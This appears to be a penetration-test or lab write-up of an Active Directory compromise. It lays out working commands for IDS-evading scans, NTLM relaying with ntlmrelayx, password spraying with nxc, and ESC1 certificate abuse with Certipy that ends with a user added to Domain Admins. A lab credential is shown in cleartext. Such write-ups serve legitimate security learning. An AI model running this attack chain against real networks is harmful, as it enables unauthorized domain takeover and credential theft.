# Tricking IDS

in general we avoided unnecessary scanning, used passive techniques like ARP, nmap'd slowly with -T 2

# Getting Initial Access

we ran responder first in analysis mode to see if any traffic comes to us.
indeed, a auth from the user nina was seen.
we tried to crack the netntlmv2 hash unsuccessfully, so our next try was NTLM relaying.

```
impacket-ntlmrelayx -t smb://10.0.4.12 -smb2support -i
```

which gave us access to the FS01 SMB shares. 
in the IT share we found some cool files such as emails which revealed further usernames.


# Second User

we updated our user list and tried to spray the top 200 passwords on those.

```
nxc smb 10.0.4.11 -u users.txt -p ../2023-200_most_used_passwords.txt  --continue-on-success
```

this revealed the user 'alice' with password' 'Demo@123'.



# Getting Domain Admin

Certipy shows vulnerable certificates:
```
python3 entry.py find -vulnerable -username 'alice' -p 'Demo@123' -dc-ip 10.0.4.11
```

Result:
```
[...]
Certificate Templates
  0
    Template Name                       : Smartcard
    Display Name                        : Smartcard
    Certificate Authorities             : PLUMETECH-DC1-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : None
    Private Key Flag                    : 16842752
    Extended Key Usage                  : Client Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : PLUMETECH.LOCAL\Domain Users
      Object Control Permissions
        Owner                           : PLUMETECH.LOCAL\Enterprise Admins
        Full Control Principals         : PLUMETECH.LOCAL\Domain Admins
                                          PLUMETECH.LOCAL\Local System
                                          PLUMETECH.LOCAL\Enterprise Admins
        Write Owner Principals          : PLUMETECH.LOCAL\Domain Admins
                                          PLUMETECH.LOCAL\Local System
                                          PLUMETECH.LOCAL\Enterprise Admins
        Write Dacl Principals           : PLUMETECH.LOCAL\Domain Admins
                                          PLUMETECH.LOCAL\Local System
                                          PLUMETECH.LOCAL\Enterprise Admins
        Write Property Principals       : PLUMETECH.LOCAL\Domain Admins
                                          PLUMETECH.LOCAL\Local System
                                          PLUMETECH.LOCAL\Enterprise Admins
    [!] Vulnerabilities
      ESC1                              : 'PLUMETECH.LOCAL\\Domain Users' can enroll, enrollee supplies subject and template allows client authentication
```

which is vulnerable to ESC1.


## ESC1 Exploitation
```
python3 entry.py req -username 'alice' -p 'Demo@123' -dc-ip 10.0.4.11 -ca PLUMETECH-DC1-CA -template Smartcard -target dc1.plumetech.local -upn backup@plumetech.local -sid S-1-5-21-742041295-2727698780-1124300366-1116

python3 entry.py auth -pfx backup.pfx -dc-ip 10.0.4.11 

export KRB5CCNAME=$PWD/backup.pfx

python3 ldap_shell/__main__.py -k -dc-host dc1.plumetech.local -no-pass plumetech.local/backup

add_user_to_group plumber "Domain Admins"
```